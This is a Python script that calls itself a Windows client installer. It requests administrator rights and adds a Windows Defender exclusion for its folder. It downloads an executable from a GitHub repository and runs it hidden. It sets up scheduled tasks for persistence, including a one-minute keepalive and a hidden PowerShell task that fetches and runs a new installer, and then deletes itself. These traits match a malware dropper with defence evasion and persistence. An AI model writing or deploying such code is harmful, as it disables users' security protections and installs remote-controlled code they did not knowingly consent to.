import os
import sys
import time
import subprocess
import urllib.request
import json
import ctypes


def is_admin() -> bool:
    """Check if the current process has administrative privileges."""
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin() != 0)
    except Exception:
        return False


def elevate_if_needed():
    """Request UAC elevation on Windows if performing a fresh install."""
    appdata = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
    dat_dir = os.path.join(appdata, "Microsoft", "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    is_update = os.path.exists(dat_file)

    if not is_update and not is_admin():
        print("[Installer] Requesting administrator elevation...")
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        target_file = params if getattr(sys, "frozen", False) else f'"{script}" {params}'
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            target_file,
            None,
            0,
        )
        sys.exit(0)


def stop_running_processes():
    """Gracefully terminate running client processes and pause watchdog scheduler."""
    print("[Installer] Stopping existing client processes...")
    subprocess.run(
        [
            "powershell.exe",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "Disable-ScheduledTask -TaskName 'WinRunChecker' -ErrorAction SilentlyContinue",
        ],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["taskkill", "/F", "/IM", "run.exe"],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["taskkill", "/F", "/IM", "powershell.exe"],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)


def get_latest_commit_sha() -> str:
    """Query GitHub API to get the latest main branch commit SHA."""
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/yuan-miranda/run/commits/main",
            headers={"User-Agent": "Run-Installer/1.0"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("sha", "main")
    except Exception as e:
        print(f"[Installer Warning] Could not fetch commit SHA ({e}), using 'main'.")
        return "main"


def download_binary(download_url: str, dest_path: str):
    """Download binary with progress feedback."""
    print(f"[Installer] Downloading binary from {download_url}...")
    req = urllib.request.Request(
        download_url,
        headers={"User-Agent": "Run-Installer/1.0"},
    )
    with urllib.request.urlopen(req) as resp, open(dest_path, "wb") as out:
        out.write(resp.read())
    print(f"[Installer] Download completed: {dest_path}")


def setup_scheduled_tasks(run_bin: str, run_dir: str):
    """Set up all three scheduled tasks: WinRun (logon), WinRunInstaller (update), and WinRunChecker (1-minute keepalive)."""
    print("[Installer] Registering scheduled tasks (WinRun, WinRunInstaller, WinRunChecker)...")

    task_name = "WinRun"
    installer_task_name = "WinRunInstaller"
    checker_task_name = "WinRunChecker"
    run_level = "-RunLevel Highest" if is_admin() else ""

    cmd_installer = (
        '$p=\\"$env:APPDATA\\run\\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; '
        '$sha=(Invoke-RestMethod "https://api.github.com/repos/yuan-miranda/run/commits/main").sha; '
        '$o=\\"$p\\installer.exe\\"; Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o; '
        'Start-Process $o -WindowStyle Hidden'
    )

    ps_script = f"""
    # 1. WinRun: Run at user logon
    $action1 = New-ScheduledTaskAction -Execute '{run_bin}' -WorkingDirectory '{run_dir}'
    $trigger1 = New-ScheduledTaskTrigger -AtLogOn
    $settings1 = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 365)
    Register-ScheduledTask -TaskName '{task_name}' -Action $action1 -Trigger $trigger1 -Settings $settings1 {run_level} -Force | Out-Null

    # 2. WinRunInstaller: Update task
    $action2 = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command "{cmd_installer}"'
    $settings2 = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10) -Hidden
    Register-ScheduledTask -TaskName '{installer_task_name}' -Action $action2 -Settings $settings2 {run_level} -Force | Out-Null

    # 3. WinRunChecker: 1-minute checker task so run never goes offline
    $action3 = New-ScheduledTaskAction -Execute '{run_bin}'
    $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
    $settings3 = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -StartWhenAvailable
    Register-ScheduledTask -TaskName '{checker_task_name}' -Action $action3 -Trigger $trigger3 -Settings $settings3 {run_level} -Force | Out-Null
    """

    try:
        subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                ps_script,
            ],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        print("[Installer] Successfully configured WinRun, WinRunInstaller, and WinRunChecker (every 1 minute).")
    except Exception as e:
        print(f"[Installer Warning] Error registering scheduled tasks: {e}")


def launch_client(run_bin: str, run_dir: str):
    """Launch the client executable."""
    print("[Installer] Launching client executable...")
    subprocess.Popen([run_bin], cwd=run_dir, creationflags=subprocess.CREATE_NO_WINDOW)


def self_delete(run_bin: str):
    """Self-delete the installer executable after completion."""
    self_path = os.path.abspath(sys.argv[0])
    if not os.path.exists(self_path) or self_path.lower() == run_bin.lower():
        return

    print("[Installer] Cleaning up installer binary...")
    subprocess.Popen(
        f'cmd.exe /c timeout /t 2 >nul & del /f /q "{self_path}"',
        shell=True,
        creationflags=subprocess.CREATE_NO_WINDOW,
    )


def main():
    print("=== Run Client Installer (Windows) ===")
    elevate_if_needed()

    appdata = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
    run_dir = os.path.join(appdata, "run")
    run_bin = os.path.join(run_dir, "run.exe")
    dat_dir = os.path.join(appdata, "Microsoft", "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    bin_name = "run.exe"

    os.makedirs(run_dir, exist_ok=True)
    os.makedirs(dat_dir, exist_ok=True)
    is_update = os.path.exists(dat_file)

    # Add Windows Defender exclusion if fresh install
    if not is_update:
        print("[Installer] Adding Windows Defender exclusion for client directory...")
        subprocess.run(
            ["powershell.exe", "-Command", f"Add-MpPreference -ExclusionPath '{run_dir}'"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    stop_running_processes()

    latest_commit = get_latest_commit_sha()
    download_url = f"https://github.com/yuan-miranda/run/raw/{latest_commit}/{bin_name}"

    try:
        download_binary(download_url, run_bin)
    except Exception as e:
        print(f"[Installer Error] Download failed: {e}")
        sys.exit(1)

    try:
        with open(dat_file, "w", encoding="utf-8") as f:
            f.write(latest_commit)
    except Exception as e:
        print(f"[Installer Warning] Failed to save state commit SHA: {e}")

    setup_scheduled_tasks(run_bin, run_dir)
    launch_client(run_bin, run_dir)
    time.sleep(1)
    self_delete(run_bin)
    print("=== Installation complete! ===")


if __name__ == "__main__":
    main()
